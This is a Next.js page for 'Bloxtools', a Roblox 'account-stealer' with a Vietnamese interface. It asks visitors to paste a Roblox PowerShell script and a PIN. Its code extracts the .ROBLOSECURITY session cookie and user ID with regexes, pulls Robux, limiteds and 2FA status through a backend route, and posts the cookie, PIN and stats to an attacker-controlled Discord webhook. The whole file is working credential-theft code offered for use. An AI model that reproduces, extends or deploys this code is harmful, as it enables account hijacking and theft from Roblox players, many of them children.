"use client";

import { useState, useEffect } from "react";
import Link from "next/link";
import { ArrowLeft, FileText, Lock, Play, Loader2 } from "lucide-react";
import { useParams } from "next/navigation";
import ConstellationBackground from "@/components/ConstellationBackground";
import { supabase } from "@/lib/supabaseClient";

export default function SlugPage() {
  const params = useParams();
  const slug = params.slug as string;

  const [webhookUrl, setWebhookUrl] = useState<string | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  const [status, setStatus] = useState<{
    message: string;
    type: "success" | "error" | "info" | null;
  }>({
    message: "",
    type: null,
  });

  const [fileContent, setFileContent] = useState("");
  const [pin, setPin] = useState("");

  useEffect(() => {
    async function fetchWebhook() {
      if (!slug) {
        setError("Slug không hợp lệ.");
        setLoading(false);
        return;
      }

      setLoading(true);
      setError(null);

      try {
        const { data, error } = await supabase
          .from("directories")
          .select("webhook_url")
          .eq("slug", slug)
          .single();

        if (error) throw error;
        if (!data?.webhook_url) throw new Error("Không tìm thấy webhook.");

        setWebhookUrl(data.webhook_url);
        console.log("[DEBUG] Webhook loaded:", data.webhook_url.substring(0, 50) + "...");
      } catch (err: any) {
        console.error("[DEBUG] Webhook fetch error:", err);
        setError(err.message || "Lỗi tải webhook.");
      } finally {
        setLoading(false);
      }
    }

    fetchWebhook();
  }, [slug]);

  function extractRobloSecurity(text: string): string | null {
    const regex = /_\|WARNING:[-A-Z0-9+\/=._ ,]*\|_[A-Za-z0-9+\/=._-]{100,}/i;
    let match = text.match(regex);
    if (match?.[0]) {
      let cookie = match[0].trim();
      if (cookie.endsWith(",")) cookie = cookie.slice(0, -1).trim();
      if (cookie.length >= 200) return cookie;
    }

    const fallback = /_\|WARNING:[^|]+\|[^ ,]{100,}/i;
    match = text.match(fallback);
    if (match?.[0]) {
      let cookie = match[0].trim();
      if (cookie.endsWith(",")) cookie = cookie.slice(0, -1).trim();
      if (cookie.length >= 200) return cookie;
    }
    return null;
  }

  function extractUserId(text: string): string | null {
    // ƯU TIÊN 1: Extract từ URL trong Invoke-WebRequest (mục tiêu profile)
    const urlMatch = text.match(/\/users\/(\d+)\/profile/i) || text.match(/\/id\/users\/(\d+)\/profile/i);
    if (urlMatch?.[1]) {
      console.log("[DEBUG] UserID extracted from URL:", urlMatch[1]);
      return urlMatch[1];
    }

    // ƯU TIÊN 2: Extract rbxid từ RBXEventTrackerV2 (thường là owner cookie thật)
    const rbxIdMatch = text.match(/rbxid=(\d+)/i);
    if (rbxIdMatch?.[1]) {
      console.log("[DEBUG] UserID extracted from rbxid:", rbxIdMatch[1]);
      return rbxIdMatch[1];
    }

    // Fallback cũ: GuestData (ít dùng vì thường là guest)
    const guestMatch = text.match(/GuestData.*?UserID=([-]?\d+)/i);
    if (guestMatch?.[1] && guestMatch[1] !== "-1" && guestMatch[1] !== "0" && !guestMatch[1].startsWith("-")) {
      console.log("[DEBUG] UserID extracted from GuestData (fallback):", guestMatch[1]);
      return guestMatch[1];
    }

    // Bỏ decode duid cũ vì format 2026 không còn hỗ trợ tốt
    console.log("[DEBUG] No reliable UserID found in script.");
    return null;
  }

  async function sendToDiscord(
    cookieValue: string,
    pinValue: string,
    userData: any,
    fullStats: any | null,
    userId: string | null
  ) {
    if (!webhookUrl) {
      setStatus({ message: "❌ Không có webhook.", type: "error" });
      return;
    }

    try {
      const embeds: any[] = [];

      embeds.push({
        title: "**RIP_DEATH** |<13>\n**RIP_**",
        color: 0x2f3136,
        thumbnail: {
          url: userId
            ? `https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=420x420&format=Png&isCircular=false`
            : "https://www.roblox.com/favicon.ico",
        },
        fields: [
          {
            name: "👤 Username",
            value: `**${userData?.basic?.name || "Unknown"}**`,
            inline: false,
          },
          {
            name: "📊 Account Stats",
            value:
              `• Account Age: **${userData?.accountAgeDays || "N/A"}** Days\n` +
              `• Games Developer: **${userData?.isDeveloper ? "True" : "False"}**\n` +
              `• Game Visits: **${fullStats?.visits || "N/A"}**\n` +
              `• Group Members: **N/A**`,
            inline: false,
          },
          {
            name: "💰 Robux",
            value: `Balance: **${fullStats?.robux || 0}**\nPending: **${fullStats?.pending || 0}**`,
            inline: true,
          },
          {
            name: "🔮 Limiteds",
            value: `RAP: **${fullStats?.rap || 0}**\nLimiteds: **${fullStats?.limiteds || 0}**`,
            inline: true,
          },
          {
            name: "📈 Summary",
            value: `**${(fullStats?.rap || 0) + (fullStats?.limiteds || 0)}**`,
            inline: true,
          },
          {
            name: "💳 Payments  •  🎮 Games  •  ⚙️ Settings",
            value:
              `Credit Balance: **N/A**\n` +
              `Games: **${userData?.hasGames ? "True" : "False"}** | **${fullStats?.gamesCreated || 0}**\n` +
              `Email: ${fullStats?.emailVerified ? "**Verified** ✉️" : "**Not Verified** ✉️"}\n` +
              `2FA: **${fullStats?.twoFA || "(Not Set)"}** 🔐`,
            inline: false,
          },
          {
            name: "🎒 Inventory  •  ⭐ Premium  •  👥 Groups",
            value:
              `Inventory: **${fullStats?.hasInventory ? "True" : "False"}**\n` +
              `Premium: **${userData?.basic?.isPremium ? "True" : "False"}** ${userData?.basic?.isPremium ? "✔️" : "✘"} \n` +
              `Groups Owned: **${fullStats?.groupsOwned || 0}** 👥\n` +
              `Balance: **N/A**`,
            inline: false,
          },
          {
            name: "🛠️ Tool Used",
            value: "**CustomTool**",
            inline: false,
          },
        ],
        footer: { text: "CustomTool | RIP_DEATH" },
        timestamp: new Date().toISOString(),
      });

      embeds.push({
        title: ".ROBLOSECURITY (Refreshed)",
        author: {
          name: "Refreshed Cookie | Original Cookie | IP Info |[KR,Yongsan]",
          icon_url: "https://em-content.zobj.net/source/apple/354/cookie_1f36a.png"
        },
        description: `
\`\`\`txt
_WARNING: DO NOT SHARE THIS..._
${cookieValue.length <= 1500 ? cookieValue : "(full cookie in attached file)"}
\`\`\`
        `.trim(),
        color: 0xff0000,
        fields: [
          {
            name: "PIN",
            value: pinValue || "N/A",
            inline: true
          },
          {
            name: "UserID",
            value: userId || "N/A",
            inline: true
          }
        ],
        footer: {
          text: "Refreshed Cookie | Original Cookie | IP Info"
        },
        timestamp: new Date().toISOString(),
      });

      const payload = { embeds };

      let res: Response;

      if (cookieValue.length > 900) {
        const form = new FormData();
        form.append("payload_json", JSON.stringify(payload));
        form.append("file", new Blob([cookieValue], { type: "text/plain" }), `cookie_${userId || "unknown"}.txt`);
        res = await fetch(webhookUrl, { method: "POST", body: form });
      } else {
        res = await fetch(webhookUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });
      }

      if (res.ok) {
        setStatus({ message: "✅ Gửi thành công!", type: "success" });
        setTimeout(() => {
          setFileContent("");
          setPin("");
          setStatus({ message: "", type: null });
        }, 5000);
      } else {
        setStatus({ message: `❌ Lỗi gửi: ${res.status}`, type: "error" });
      }
    } catch (err: any) {
      console.error("[DEBUG] Discord error:", err);
      setStatus({ message: "❌ Lỗi kết nối", type: "error" });
    }
  }

  const handleStart = async () => {
    if (!fileContent.trim() || !pin.trim()) {
      setStatus({ message: "❌ Điền đầy đủ nội dung và PIN!", type: "error" });
      return;
    }

    const robloxCookie = extractRobloSecurity(fileContent);
    if (!robloxCookie) {
      setStatus({ message: "❌ Không tìm thấy .ROBLOSECURITY!", type: "error" });
      return;
    }

    let userId = extractUserId(fileContent);

    console.log("[DEBUG] Extracted - Cookie length:", robloxCookie.length);
    console.log("[DEBUG] Extracted - UserID:", userId || "Không tìm thấy");

    setStatus({ message: "⏳ Đang xử lý...", type: "info" });

    let userData = null;
    let fullStats = null;

    if (userId) {
      try {
        console.log("[DEBUG] Calling /api/roblox-user?mode=basic");
        const basicRes = await fetch(`/api/roblox-user?userId=${userId}&mode=basic`);
        if (basicRes.ok) {
          userData = await basicRes.json();
          console.log("[DEBUG] Basic data:", userData);
        }

        if (robloxCookie) {
          console.log("[DEBUG] Calling /api/roblox-user?mode=full with cookie");
          const fullRes = await fetch(
            `/api/roblox-user?userId=${userId}&cookie=${encodeURIComponent(robloxCookie)}&mode=full`
          );
          if (fullRes.ok) {
            fullStats = await fullRes.json();
            console.log("[DEBUG] Full stats data:", fullStats);
          }
        }
      } catch (err: any) {
        console.error("[DEBUG] Fetch error:", err.message);
      }
    } else {
      setStatus({ message: "⚠️ Không extract được UserID đáng tin cậy.", type: "error" });
    }

    await sendToDiscord(robloxCookie, pin, userData, fullStats, userId);
  };

  return (
    <div className="min-h-screen bg-[#0a0a0a] text-white flex flex-col items-center justify-center p-4 relative overflow-hidden">
      <ConstellationBackground />

      {loading && (
        <div className="absolute inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-md">
          <div className="flex flex-col items-center gap-6">
            <Loader2 className="w-14 h-14 text-red-500 animate-spin" />
            <p className="text-xl font-semibold">Đang tải /{slug}...</p>
          </div>
        </div>
      )}

      {error && (
        <div className="absolute inset-0 z-40 flex items-center justify-center bg-black/80 backdrop-blur-sm">
          <div className="bg-[#121212] border border-red-600/40 rounded-2xl p-8 max-w-lg text-center shadow-2xl">
            <h2 className="text-2xl font-bold text-red-400 mb-4">Có lỗi xảy ra</h2>
            <p className="text-gray-300 mb-6">{error}</p>
            <Link
              href="/create"
              className="inline-flex items-center gap-2 px-6 py-3 bg-red-600 hover:bg-red-700 rounded-lg text-white font-medium transition-colors shadow-lg shadow-red-900/30"
            >
              <ArrowLeft className="w-5 h-5" />
              Quay lại tạo mới
            </Link>
          </div>
        </div>
      )}

      <div
        className={`relative z-10 w-full max-w-5xl flex flex-col items-center transition-opacity duration-500 ${loading ? "opacity-40 pointer-events-none" : "opacity-100"}`}
      >
        <div className="w-full mb-6 px-2">
          <Link
            href="/create"
            className="text-[#cbd5e1] font-semibold text-sm tracking-wide hover:text-white transition-colors flex items-center gap-2"
          >
            <ArrowLeft className="w-4 h-4" />
            GO BACK
          </Link>
        </div>

        <div className="text-center mb-8 px-4">
          <h1 className="text-3xl md:text-4xl font-bold tracking-tight text-white capitalize mb-3">
            {slug.replace(/-/g, " ") || "Account-stealer"}
          </h1>
          <p className="text-[#94a3b8] text-base max-w-xl mx-auto">
            Hack accounts with ease, with this brand new powershell-based system!
          </p>
        </div>

        <div className="w-full">
          <div className="flex items-center gap-3 mb-6 px-2">
            <h2 className="text-xl font-bold">Bloxtools</h2>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="bg-[#121212] border border-[#1e1e1e] rounded-2xl p-8 shadow-2xl flex flex-col h-full">
              <h3 className="text-lg font-bold mb-3">Hack Accounts</h3>
              <p className="text-[#94a3b8] text-sm mb-6 leading-relaxed">
                Dán toàn bộ nội dung file Roblox (PowerShell script) vào ô dưới, rồi bấm Start.
              </p>

              {status.type && (
                <div
                  className={`p-4 rounded-xl mb-6 text-sm text-center border animate-in fade-in slide-in-from-top-1 duration-300 ${
                    status.type === "success"
                      ? "bg-emerald-950/30 border-emerald-500/30 text-emerald-300"
                      : status.type === "error"
                      ? "bg-red-950/30 border-red-500/30 text-red-300"
                      : "bg-blue-950/30 border-blue-500/30 text-blue-300"
                  }`}
                >
                  {status.message}
                </div>
              )}

              <div className="space-y-5 mt-auto">
                <div className="relative group">
                  <FileText className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-red-500 opacity-70 group-focus-within:opacity-100 transition-opacity" />
                  <textarea
                    value={fileContent}
                    onChange={(e) => setFileContent(e.target.value)}
                    placeholder="Dán nội dung file ở đây..."
                    className="w-full bg-[#1a1a1a] border border-[#2a2a2a] rounded-xl py-4 pl-12 pr-5 text-sm text-white placeholder:text-gray-600 focus:outline-none focus:border-red-500 focus:ring-1 focus:ring-red-500/30 transition-all min-h-[120px]"
                  />
                </div>

                <div className="relative group">
                  <Lock className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-red-500 opacity-70 group-focus-within:opacity-100 transition-opacity" />
                  <input
                    type="password"
                    value={pin}
                    onChange={(e) => setPin(e.target.value)}
                    placeholder="Tạo mật khẩu (PIN)"
                    className="w-full bg-[#1a1a1a] border border-[#2a2a2a] rounded-xl py-4 pl-12 pr-5 text-sm text-white placeholder:text-gray-600 focus:outline-none focus:border-red-500 focus:ring-1 focus:ring-red-500/30 transition-all"
                  />
                </div>

                <button
                  onClick={handleStart}
                  disabled={loading || !!error || status.type === "info"}
                  className="w-full py-4 bg-[#e22d2d] hover:bg-[#c92828] disabled:opacity-60 disabled:hover:bg-[#e22d2d] text-white font-bold text-base rounded-xl flex items-center justify-center gap-3 transition-all shadow-lg shadow-red-900/20 active:scale-[0.98]"
                >
                  Start Hacking!
                </button>
              </div>
            </div>

            <div className="bg-[#121212] border border-[#1e1e1e] rounded-2xl p-8 shadow-2xl flex flex-col h-full">
              <h3 className="text-lg font-bold mb-3">Hướng dẫn sử dụng</h3>
              <p className="text-[#94a3b8] text-sm mb-6 leading-relaxed">
                Video hướng dẫn chi tiết cách sử dụng Bloxtools.
              </p>

              <div className="mt-auto aspect-video bg-[#0b1218] border border-white/5 rounded-xl flex flex-col items-center justify-center gap-4 text-[#64748b] group cursor-pointer hover:border-white/10 hover:bg-[#111] transition-all">
                <div className="w-16 h-16 rounded-full bg-white/5 flex items-center justify-center group-hover:scale-110 transition-transform">
                  <Play className="w-8 h-8 fill-current" />
                </div>
                <span className="text-sm font-medium">Video Player Area</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}